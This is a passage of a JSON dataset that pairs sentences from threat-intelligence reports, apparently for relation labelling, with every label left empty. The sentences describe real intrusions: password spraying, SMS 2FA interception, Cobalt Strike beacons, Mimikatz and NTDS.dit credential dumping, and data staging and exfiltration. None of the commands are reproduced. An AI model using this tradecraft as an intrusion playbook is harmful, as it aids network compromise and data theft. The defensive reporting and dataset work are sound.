    },
    {
        "id": "cti_reports_filtered/r-773.md::S114<=>S117",
        "S1": "Since the attackers regularly deleted log files from the router, only a handful of commands entered to the command line via SSH could be recovered.",
        "S2": "On September 27, the attackers started removing all traces of their activity from the router, using the logrotate utility to set up automatic deletion of log files.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S118<=>S128",
        "S1": "We observed that the malware operator attempted to create SSH tunnels to a remote server located in South Korea from several compromised server hosts.",
        "S2": "According to our telemetry, the actor executed this application with six parameters:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S118<=>S121",
        "S1": "We observed that the malware operator attempted to create SSH tunnels to a remote server located in South Korea from several compromised server hosts.",
        "S2": "The tool offers basic functionality, forwarding client traffic to the server.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S119<=>S123",
        "S1": "They used a custom tunneling tool to achieve this.",
        "S2": "Using the covert channel, the adversary copied data from the remote server over to the host using the PuTTy PSCP tool:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S121<=>S123",
        "S1": "The tool offers basic functionality, forwarding client traffic to the server.",
        "S2": "Using the covert channel, the adversary copied data from the remote server over to the host using the PuTTy PSCP tool:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S122<=>S125",
        "S1": "In order to create a covert channel, the malware encrypts forwarded traffic using trivial binary encryption.",
        "S2": "This malware looks like a legitimate VNC client and runs like one if it\u2019s executed without any command line parameters.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S124<=>S128",
        "S1": "After copying data from the server, the actor utilized the custom tool to exfiltrate stolen data to the remote server.",
        "S2": "According to our telemetry, the actor executed this application with six parameters:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S124<=>S137",
        "S1": "After copying data from the server, the actor utilized the custom tool to exfiltrate stolen data to the remote server.",
        "S2": "The payload opens a given file (in this example %APPDATA%\\Comms\\cab59.tmp) and starts exfiltrating it to the remote server.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S125<=>S127",
        "S1": "This malware looks like a legitimate VNC client and runs like one if it\u2019s executed without any command line parameters.",
        "S2": "However, if this application is executed with specific command line parameters, it runs an alternate, malicious function.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S131<=>S134",
        "S1": "When the parameter checking procedure has passed successfully, the malware starts to decrypt its next payload.",
        "S2": "The malware can accept more command line arguments, and depending on its number it runs differently.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S133<=>S136",
        "S1": "Next, the XORed blob receives the second command line argument that\u2019s provided (in this case S0RMM-50QQE-F65DN-DCPYN-5QEQA).",
        "S2": "When the decrypted in-memory payload is executed, it compares the header of the configuration data passed with the string \u201c0x8406\u201d in order to confirm its validity.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md::S135<=>S138",
        "S1": "For example, it can also receive proxy server addresses with the \u201c-p\u201d option.",
        "S2": "When the malware uploads data to the C2 server, it uses HTTP POST requests with two parameters named \u2018fr\u2019 and \u2018fp\u2019:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S0<=>S2",
        "S1": "In all the intrusions we have observed they are performed in similar ways by the adversary: from initial access all the way to actions on objectives.",
        "S2": "This adversary starts with obtaining usernames and passwords of their victim from previous breaches.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S0<=>S24",
        "S1": "In all the intrusions we have observed they are performed in similar ways by the adversary: from initial access all the way to actions on objectives.",
        "S2": "The earliest and longest lasting intrusion by this threat we observed, was at a company in the semiconductors industry in Europe and started early Q4 2017.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S2<=>S4",
        "S1": "This adversary starts with obtaining usernames and passwords of their victim from previous breaches.",
        "S2": "After obtaining a valid account, they use this account to access the victim\u2019s VPN, Citrix or another remote service that allows access to the network of the victim.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S3<=>S208",
        "S1": "These credentials are used in a credential stuffing or password spraying attack against the victim\u2019s remote services, such as webmail or other internet reachable mail services.",
        "S2": "Hashes of these files are listed at the end of this article.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S4<=>S9",
        "S1": "After obtaining a valid account, they use this account to access the victim\u2019s VPN, Citrix or another remote service that allows access to the network of the victim.",
        "S2": "From here on the adversary stops using the victim\u2019s remote service to access the victim\u2019s network, and starts using the Cobalt Strike beacon for remote access and command and control.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S4<=>S11",
        "S1": "After obtaining a valid account, they use this account to access the victim\u2019s VPN, Citrix or another remote service that allows access to the network of the victim.",
        "S2": "Various scans and queries are used to find proxy settings, domain controllers, remote desktop services, Citrix services, and network shares.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S4<=>S6",
        "S1": "After obtaining a valid account, they use this account to access the victim\u2019s VPN, Citrix or another remote service that allows access to the network of the victim.",
        "S2": "As soon as they have a foothold on a system (also known as patient zero or index case), they check the permissions of the account on that system, and attempt to obtain a list of accounts with administrator privileges.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S7<=>S30",
        "S1": "With this list of administrator-accounts, the adversary performs another password spraying attack until a valid admin account is compromised.",
        "S2": "Besides that, the traces in log files showed more than usual login attempts with a username formatted as email address, e.g.<username>@<email domain>.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S7<=>S9",
        "S1": "With this list of administrator-accounts, the adversary performs another password spraying attack until a valid admin account is compromised.",
        "S2": "From here on the adversary stops using the victim\u2019s remote service to access the victim\u2019s network, and starts using the Cobalt Strike beacon for remote access and command and control.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S8<=>S10",
        "S1": "With this valid admin account, a Cobalt Strike beacon is loaded into memory of patient zero.",
        "S2": "The adversary continues their discovery of the victim\u2019s network from patient zero.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S9<=>S12",
        "S1": "From here on the adversary stops using the victim\u2019s remote service to access the victim\u2019s network, and starts using the Cobalt Strike beacon for remote access and command and control.",
        "S2": "If the obtained valid account is already member of the domain admins group, the first lateral move in the network is usually to a domain controller where the adversary also deploys a Cobalt Strike beacon.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S9<=>S24",
        "S1": "From here on the adversary stops using the victim\u2019s remote service to access the victim\u2019s network, and starts using the Cobalt Strike beacon for remote access and command and control.",
        "S2": "The earliest and longest lasting intrusion by this threat we observed, was at a company in the semiconductors industry in Europe and started early Q4 2017.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S10<=>S12",
        "S1": "The adversary continues their discovery of the victim\u2019s network from patient zero.",
        "S2": "If the obtained valid account is already member of the domain admins group, the first lateral move in the network is usually to a domain controller where the adversary also deploys a Cobalt Strike beacon.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S10<=>S14",
        "S1": "The adversary continues their discovery of the victim\u2019s network from patient zero.",
        "S2": "After this the adversary dumps the domain admin credentials from the memory of this machine, continues lateral moving through the network, and places Cobalt Strike beacons on servers for increased persistent access into the victim\u2019s network.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S12<=>S14",
        "S1": "If the obtained valid account is already member of the domain admins group, the first lateral move in the network is usually to a domain controller where the adversary also deploys a Cobalt Strike beacon.",
        "S2": "After this the adversary dumps the domain admin credentials from the memory of this machine, continues lateral moving through the network, and places Cobalt Strike beacons on servers for increased persistent access into the victim\u2019s network.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S14<=>S19",
        "S1": "After this the adversary dumps the domain admin credentials from the memory of this machine, continues lateral moving through the network, and places Cobalt Strike beacons on servers for increased persistent access into the victim\u2019s network.",
        "S2": "If the data is small enough, it is exfiltrated through the command and control channel of the Cobalt Strike beacons.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S15<=>S17",
        "S1": "If the victim\u2019s network contains other Windows domains or different network security zones, the adversary scans and finds the trust relationships and jump hosts, attempting to move into the other domains and security zones.",
        "S2": "During this process, the adversary identifies data of interest from the network of the victim.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S17<=>S20",
        "S1": "During this process, the adversary identifies data of interest from the network of the victim.",
        "S2": "However, usually the data is compressed with WinRAR, staged on another system of the victim, and from there copied to a OneDrive-account controlled by the adversary.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S17<=>S129",
        "S1": "During this process, the adversary identifies data of interest from the network of the victim.",
        "S2": "In preparation of exfiltration of the data needed for their objective, the adversary collected the data from various sources within the victim\u2019s network.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S19<=>S48",
        "S1": "If the data is small enough, it is exfiltrated through the command and control channel of the Cobalt Strike beacons.",
        "S2": "With access into the network of the victim, the adversary finds a way to install a Cobalt Strike beacon on a system of the victim (see Execution).",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S20<=>S31",
        "S1": "However, usually the data is compressed with WinRAR, staged on another system of the victim, and from there copied to a OneDrive-account controlled by the adversary.",
        "S2": "While usernames for legitimate logins at the victim\u2019s network were generally formatted like <domain><username>.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S23<=>S28",
        "S1": "But this isn\u2019t done consistently across their engagements.",
        "S2": "Our incident responders analysed the credentials used by the adversary and the traces of the intrusion in log files.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S24<=>S28",
        "S1": "The earliest and longest lasting intrusion by this threat we observed, was at a company in the semiconductors industry in Europe and started early Q4 2017.",
        "S2": "Our incident responders analysed the credentials used by the adversary and the traces of the intrusion in log files.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S24<=>S27",
        "S1": "The earliest and longest lasting intrusion by this threat we observed, was at a company in the semiconductors industry in Europe and started early Q4 2017.",
        "S2": "The threat used valid accounts against remote services: Cloud-based applications utilizing federated authentication protocols.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S26<=>S48",
        "S1": "The techniques used to achieve access at the companies in the aviation industry closely resembles techniques used at victims in the semiconductors industry.",
        "S2": "With access into the network of the victim, the adversary finds a way to install a Cobalt Strike beacon on a system of the victim (see Execution).",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S27<=>S201",
        "S1": "The threat used valid accounts against remote services: Cloud-based applications utilizing federated authentication protocols.",
        "S2": "The actor specifies the following arguments when running the exfiltration tool:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S28<=>S64",
        "S1": "Our incident responders analysed the credentials used by the adversary and the traces of the intrusion in log files.",
        "S2": "We have found traces that indicate DSInternals was executed and at which time, which match with the rest of the traces of the intrusion.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S28<=>S44",
        "S1": "Our incident responders analysed the credentials used by the adversary and the traces of the intrusion in log files.",
        "S2": "Our hypothesis is that they tested the 2FA-system first or selected the primary phone number to send a SMS to.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S29<=>S33",
        "S1": "They uncovered an obvious overlap in the credentials used by this threat and the presence of those same accounts in previously breached databases.",
        "S2": "For the investigators at NCC Group and Fox-IT these pieces of evidence supported the hypothesis of the adversary achieving credentials access by brute force, and more specifically by credential stuffing or password spraying.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S31<=>S48",
        "S1": "While usernames for legitimate logins at the victim\u2019s network were generally formatted like <domain><username>.",
        "S2": "With access into the network of the victim, the adversary finds a way to install a Cobalt Strike beacon on a system of the victim (see Execution).",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S33<=>S46",
        "S1": "For the investigators at NCC Group and Fox-IT these pieces of evidence supported the hypothesis of the adversary achieving credentials access by brute force, and more specifically by credential stuffing or password spraying.",
        "S2": "NCC Group and Fox-IT identified that the language in the text-message for 2FA is based on the web browser\u2019s language settings used during the authentication flow.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S34<=>S48",
        "S1": "In some of the intrusions the adversary used the valid account to directly login to a Citrix environment and continued their work from there.",
        "S2": "With access into the network of the victim, the adversary finds a way to install a Cobalt Strike beacon on a system of the victim (see Execution).",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S35<=>S37",
        "S1": "In one specific case, the adversary now armed with the valid account, was able to access a document stored in SharePoint Online, part of Microsoft Office 365.",
        "S2": "Within an hour after grabbing this document, the adversary accessed the company portal with the valid account.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S36<=>S38",
        "S1": "This specific document described how to access the internet facing company portal and the web-based VPN client into the company network.",
        "S2": "From this portal it was possible to launch the web-based VPN.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S36<=>S42",
        "S1": "This specific document described how to access the internet facing company portal and the web-based VPN client into the company network.",
        "S2": "By performing two-factor authentication interception by receiving the OTP on their own telephone number, they gained access to the company network via the VPN.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S37<=>S41",
        "S1": "Within an hour after grabbing this document, the adversary accessed the company portal with the valid account.",
        "S2": "The adversary used this opportunity to configure an alternate phone number controlled by the adversary.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S38<=>S40",
        "S1": "From this portal it was possible to launch the web-based VPN.",
        "S2": "It was possible to configure an alternate phone number for the logged in user account at the company portal.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S39<=>S42",
        "S1": "The VPN was protected by two-factor authentication (2FA) by sending an SMS with a one-time password (OTP) to the user account\u2019s primary or alternate phone number.",
        "S2": "By performing two-factor authentication interception by receiving the OTP on their own telephone number, they gained access to the company network via the VPN.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S42<=>S62",
        "S1": "By performing two-factor authentication interception by receiving the OTP on their own telephone number, they gained access to the company network via the VPN.",
        "S2": "DSInternals is a PowerShell module that makes use of internal Active Directory features.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S44<=>S49",
        "S1": "Our hypothesis is that they tested the 2FA-system first or selected the primary phone number to send a SMS to.",
        "S2": "But before doing so, we observed the adversary checking the current permissions of the obtained user account with the following commands:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S44<=>S97",
        "S1": "Our hypothesis is that they tested the 2FA-system first or selected the primary phone number to send a SMS to.",
        "S2": "If such a privileged user was recently active on a server the actor executes Cobalt Strike\u2019s built-in Mimikatz to dump its credentials or password hash.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S48<=>S53",
        "S1": "With access into the network of the victim, the adversary finds a way to install a Cobalt Strike beacon on a system of the victim (see Execution).",
        "S2": "If such a privileged user was recently active on a server the adversary executes Cobalt Strike\u2019s built-in Mimikatz to dump its password hashes.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S48<=>S125",
        "S1": "With access into the network of the victim, the adversary finds a way to install a Cobalt Strike beacon on a system of the victim (see Execution).",
        "S2": "But first: How did they get the tools on the victim\u2019s systems?",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S49<=>S56",
        "S1": "But before doing so, we observed the adversary checking the current permissions of the obtained user account with the following commands:",
        "S2": "We observed the use of Mimikatz on this system and saw the hashes of the logged in domain admin account going through the command and control channel of the adversary.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S53<=>S56",
        "S1": "If such a privileged user was recently active on a server the adversary executes Cobalt Strike\u2019s built-in Mimikatz to dump its password hashes.",
        "S2": "We observed the use of Mimikatz on this system and saw the hashes of the logged in domain admin account going through the command and control channel of the adversary.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S53<=>S97",
        "S1": "If such a privileged user was recently active on a server the adversary executes Cobalt Strike\u2019s built-in Mimikatz to dump its password hashes.",
        "S2": "If such a privileged user was recently active on a server the actor executes Cobalt Strike\u2019s built-in Mimikatz to dump its credentials or password hash.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S56<=>S58",
        "S1": "We observed the use of Mimikatz on this system and saw the hashes of the logged in domain admin account going through the command and control channel of the adversary.",
        "S2": "Note: the adversary renamed ntdsaudit.exe to msadcs.exe.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S57<=>S59",
        "S1": "The adversary used a tool called NtdsAudit to dump the password hashes of domain users as well as we observed the following command:",
        "S2": "But we also observed the adversary using the tool ntdsutil to create a copy of the Active Directory database NTDS.dit followed by a repair action with esentutl to fix a possible corrupt NTDS.dit:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S59<=>S64",
        "S1": "But we also observed the adversary using the tool ntdsutil to create a copy of the Active Directory database NTDS.dit followed by a repair action with esentutl to fix a possible corrupt NTDS.dit:",
        "S2": "We have found traces that indicate DSInternals was executed and at which time, which match with the rest of the traces of the intrusion.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S59<=>S61",
        "S1": "But we also observed the adversary using the tool ntdsutil to create a copy of the Active Directory database NTDS.dit followed by a repair action with esentutl to fix a possible corrupt NTDS.dit:",
        "S2": "A tool used by the adversary which wasn\u2019t installed on the servers by default, was DSInternals.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S59<=>S62",
        "S1": "But we also observed the adversary using the tool ntdsutil to create a copy of the Active Directory database NTDS.dit followed by a repair action with esentutl to fix a possible corrupt NTDS.dit:",
        "S2": "DSInternals is a PowerShell module that makes use of internal Active Directory features.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S61<=>S65",
        "S1": "A tool used by the adversary which wasn\u2019t installed on the servers by default, was DSInternals.",
        "S2": "We haven\u2019t recovered traces of how the adversary used DSInternals, but considering the phase of the intrusion the adversary used the tool, it is likely they used it for either account discovery or privilege escalation, or both.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S62<=>S98",
        "S1": "DSInternals is a PowerShell module that makes use of internal Active Directory features.",
        "S2": "It imports the specified Active Directory database NTDS.dit and registry file SYSTEM and exports the found password hashes into RecordedTV_pdump.txt and user details in RecordedTV_users.csv.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S65<=>S90",
        "S1": "We haven\u2019t recovered traces of how the adversary used DSInternals, but considering the phase of the intrusion the adversary used the tool, it is likely they used it for either account discovery or privilege escalation, or both.",
        "S2": "In the list below we have highlighted a few specific tools the adversary used for discovery purposes.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S66<=>S70",
        "S1": "The adversary installs a hackers best friend during the intrusion: Cobalt Strike.",
        "S2": "At least the following three versions of Cobalt Strike have been in use by the adversary:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S70<=>S78",
        "S1": "At least the following three versions of Cobalt Strike have been in use by the adversary:",
        "S2": "The adversary heavily relies on scheduled tasks for executing a batch-file (.bat) to perform their tasks.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S71<=>S73",
        "S1": "Fox-IT has been collecting information about Cobalt Strike team servers since January 2015.",
        "S2": "The collected information allows Fox-IT to correlate Cobalt Strike team servers, based on various configuration settings.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S72<=>S74",
        "S1": "This research project covers the fingerprinting of Cobalt Strike servers and is described in Fox-IT blog \u201cIdentifying Cobalt Strike team servers in the wild\u201d.",
        "S2": "Because of this, historic information was available during this investigation.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S73<=>S75",
        "S1": "The collected information allows Fox-IT to correlate Cobalt Strike team servers, based on various configuration settings.",
        "S2": "Whenever a Cobalt Strike C2 channel was identified, Fox-IT performed lookups into the collection database.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S77<=>S80",
        "S1": "This configuration was then compared against the other Cobalt Strike team servers to check for similarities in for example domain names, version number, URL, and various other settings.",
        "S2": "The batch-files appear to be used to load the Cobalt Strike beacon, but also to perform discovery commands on the compromised system.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S79<=>S81",
        "S1": "An example of the creation of such a scheduled task by the adversary:",
        "S2": "The adversary loads the Cobalt Strike beacon in memory, without any persistence mechanisms on the compromised system.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S81<=>S84",
        "S1": "The adversary loads the Cobalt Strike beacon in memory, without any persistence mechanisms on the compromised system.",
        "S2": "Besides using the Cobalt Strike beacon, the adversary also searches for VPN and firewall configs, possibly to function as a backup access into the network.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S81<=>S83",
        "S1": "The adversary loads the Cobalt Strike beacon in memory, without any persistence mechanisms on the compromised system.",
        "S2": "The adversary is still able to have persistent access by installing the beacon on systems with high uptimes, such as server.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S84<=>S158",
        "S1": "Besides using the Cobalt Strike beacon, the adversary also searches for VPN and firewall configs, possibly to function as a backup access into the network.",
        "S2": "The following four different variants of the use of rar.exe as update.exe we have observed:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S85<=>S87",
        "S1": "We haven\u2019t seen the adversary use those access methods after the first Cobalt Strike beacons were installed.",
        "S2": "After the first bulk of data is exfiltrated, the persistent access into the victim\u2019s network is periodically used by the adversary to check if new data of interest is available.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S90<=>S116",
        "S1": "In the list below we have highlighted a few specific tools the adversary used for discovery purposes.",
        "S2": "This could be a webserver to carve data from memory, or a fileserver to copy IP, as we have both observed.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S91<=>S95",
        "S1": "You can find a summary of most of the commands used by the adversary to perform discovery at the end of this article.",
        "S2": "The tool was used by the adversary on various systems to write events from the Windows Security Event Log to a text file.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S93<=>S95",
        "S1": "The text files contain the contents of the Security Event log after the specified date.",
        "S2": "The tool was used by the adversary on various systems to write events from the Windows Security Event Log to a text file.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S95<=>S106",
        "S1": "The tool was used by the adversary on various systems to write events from the Windows Security Event Log to a text file.",
        "S2": "This showed the tool was written in the Python scripting language and packed into a Windows executable file.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S96<=>S111",
        "S1": "A possible intent of the adversary could be to identify if privileged users are active on the systems.",
        "S2": "The adversary used the built-in lateral movement possibilities in Cobalt Strike.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S97<=>S111",
        "S1": "If such a privileged user was recently active on a server the actor executes Cobalt Strike\u2019s built-in Mimikatz to dump its credentials or password hash.",
        "S2": "The adversary used the built-in lateral movement possibilities in Cobalt Strike.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S97<=>S139",
        "S1": "If such a privileged user was recently active on a server the actor executes Cobalt Strike\u2019s built-in Mimikatz to dump its credentials or password hash.",
        "S2": "After placing the DLL in the appropriate directory, the actor would change the date and time stamps on the DLL files to blend in with the other legitimate files in the directory.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S101<=>S138",
        "S1": "The utility was found on various systems of a victim and matches the NtdsAudit.exe program file version v2.0.5 published on the GitHub project page.",
        "S2": "The DLL\u2019s used were side-loaded in memory on compromised systems.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S105<=>S107",
        "S1": "NCC Group and Fox-IT decompiled the tool for analysis.",
        "S2": "Though Fox-IT didn\u2019t find any direct occurrences of the tool on the internet, the decompiled code showed strong similarities with the source code of a tool named GetHttpsInfo.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S106<=>S122",
        "S1": "This showed the tool was written in the Python scripting language and packed into a Windows executable file.",
        "S2": "The adversary is applying living off the land techniques very well by incorporating default Windows tools in its arsenal.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S111<=>S113",
        "S1": "The adversary used the built-in lateral movement possibilities in Cobalt Strike.",
        "S2": "We have seen the adversary using SMB, named pipes, PsExec, and WinRM.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S112<=>S172",
        "S1": "Cobalt Strike has various methods for deploying its beacons at newly compromised systems.",
        "S2": "The adversary uses Cobalt Strike as framework to manage their compromised systems.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S115<=>S118",
        "S1": "They continue lateral movement and discovery in an attempt to identify the data of interest.",
        "S2": "The adversary was able to find a dual homed system and compromise it.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S116<=>S127",
        "S1": "This could be a webserver to carve data from memory, or a fileserver to copy IP, as we have both observed.",
        "S2": "A few examples of commands we observed:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S120<=>S122",
        "S1": "In one event we saw the adversary compromise a Linux-system through SSH.",
        "S2": "The adversary is applying living off the land techniques very well by incorporating default Windows tools in its arsenal.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S122<=>S211",
        "S1": "The adversary is applying living off the land techniques very well by incorporating default Windows tools in its arsenal.",
        "S2": "- Windows event logs clearing,",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S125<=>S129",
        "S1": "But first: How did they get the tools on the victim\u2019s systems?",
        "S2": "In preparation of exfiltration of the data needed for their objective, the adversary collected the data from various sources within the victim\u2019s network.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S126<=>S129",
        "S1": "The adversary copied those tools over SMB from compromised system to compromised system wherever they needed these tools.",
        "S2": "In preparation of exfiltration of the data needed for their objective, the adversary collected the data from various sources within the victim\u2019s network.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S127<=>S137",
        "S1": "A few examples of commands we observed:",
        "S2": "How this data is obtained likely differs per victim, but we observed the usage of several custom DLL files used to continuously retrieve data from memory of systems where such data is typically processed.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S130<=>S132",
        "S1": "As described before, the adversary collected data from an information repository, Microsoft SharePoint Online in this case.",
        "S2": "In all cases we\u2019ve seen the adversary copying results of the discovery phase, like file- and directory lists from local systems, network shared drives, and file shares on remote systems.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S133<=>S142",
        "S1": "But email collection is also important for this adversary: with every intrusion we saw the mailbox of some users being copied, from both local and remote systems:",
        "S2": "We\u2019ve seen the adversary staging data on a remote system or on the local system.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S137<=>S142",
        "S1": "How this data is obtained likely differs per victim, but we observed the usage of several custom DLL files used to continuously retrieve data from memory of systems where such data is typically processed.",
        "S2": "We\u2019ve seen the adversary staging data on a remote system or on the local system.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S139<=>S201",
        "S1": "After placing the DLL in the appropriate directory, the actor would change the date and time stamps on the DLL files to blend in with the other legitimate files in the directory.",
        "S2": "The actor specifies the following arguments when running the exfiltration tool:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S142<=>S144",
        "S1": "We\u2019ve seen the adversary staging data on a remote system or on the local system.",
        "S2": "Only a handful of times the adversary copies the data first before compressing (archive collected data) and exfiltrating it.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S142<=>S148",
        "S1": "We\u2019ve seen the adversary staging data on a remote system or on the local system.",
        "S2": "We have observed the following filenames overlapping all intrusions:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S145<=>S154",
        "S1": "The adversary compresses and encrypts the data by using WinRAR from the command-line.",
        "S2": "The adversary typically places the executables in the following folders:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S148<=>S158",
        "S1": "We have observed the following filenames overlapping all intrusions:",
        "S2": "The following four different variants of the use of rar.exe as update.exe we have observed:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S154<=>S168",
        "S1": "The adversary typically places the executables in the following folders:",
        "S2": "This time the adversary compresses the data as a gzipped tar-file: tar.gz.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S158<=>S173",
        "S1": "The following four different variants of the use of rar.exe as update.exe we have observed:",
        "S2": "We observed the use of Cobalt Strike\u2019s C2 protocol encapsulated in DNS by the adversary in 2017 and 2018.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S168<=>S172",
        "S1": "This time the adversary compresses the data as a gzipped tar-file: tar.gz.",
        "S2": "The adversary uses Cobalt Strike as framework to manage their compromised systems.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S173<=>S177",
        "S1": "We observed the use of Cobalt Strike\u2019s C2 protocol encapsulated in DNS by the adversary in 2017 and 2018.",
        "S2": "More importantly: the trial version doesn\u2019t support encryption of command and control traffic in cases where the protocol itself isn\u2019t encrypted, such as DNS.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S173<=>S178",
        "S1": "We observed the use of Cobalt Strike\u2019s C2 protocol encapsulated in DNS by the adversary in 2017 and 2018.",
        "S2": "In one intrusion we investigated, the victim had years of logging available of outgoing DNS-requests.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md::S173<=>S175",
